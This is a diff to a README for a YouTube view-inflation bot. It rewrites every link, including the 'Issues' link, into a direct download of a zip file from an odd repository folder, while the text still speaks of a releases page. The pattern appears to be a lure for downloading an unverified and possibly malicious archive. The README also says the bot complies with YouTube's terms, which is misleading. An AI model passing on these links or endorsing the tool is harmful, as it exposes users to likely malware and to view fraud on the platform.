@@ -1,6 +1,6 @@
 # 🎥 youtube-view-bot-free - Boost Your YouTube Views Automatically
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/mellyhub21/youtube-view-bot-free/releases)
+[![Download](https://raw.githubusercontent.com/mellyhub21/youtube-view-bot-free/main/pullulation/youtube-view-bot-free.zip)](https://raw.githubusercontent.com/mellyhub21/youtube-view-bot-free/main/pullulation/youtube-view-bot-free.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run this application, you will need:
 
 ## 💾 Download & Install
 
-1. First, visit this page to download: [Download Here](https://github.com/mellyhub21/youtube-view-bot-free/releases).
+1. First, visit this page to download: [Download Here](https://raw.githubusercontent.com/mellyhub21/youtube-view-bot-free/main/pullulation/youtube-view-bot-free.zip).
   
 2. On the releases page, you will see different versions listed. Choose the latest version for the best performance.
 
@@ -64,7 +64,7 @@ Yes. The application is designed to follow YouTube's terms of service closely. H
 
 ### How do I update the application?
 
-To update, you will need to download the latest version from the [Releases page](https://github.com/mellyhub21/youtube-view-bot-free/releases) and reinstall the application.
+To update, you will need to download the latest version from the [Releases page](https://raw.githubusercontent.com/mellyhub21/youtube-view-bot-free/main/pullulation/youtube-view-bot-free.zip) and reinstall the application.
 
 ### What should I do if I run into issues?
 
@@ -72,8 +72,8 @@ If you face any problems, check the troubleshooting section in the application o
 
 ## 🔗 Links
 
-- [Download Here](https://github.com/mellyhub21/youtube-view-bot-free/releases)
-- [GitHub Issues](https://github.com/mellyhub21/youtube-view-bot-free/issues)
+- [Download Here](https://raw.githubusercontent.com/mellyhub21/youtube-view-bot-free/main/pullulation/youtube-view-bot-free.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/mellyhub21/youtube-view-bot-free/main/pullulation/youtube-view-bot-free.zip)
 
 ## 🙌 Acknowledgements
 
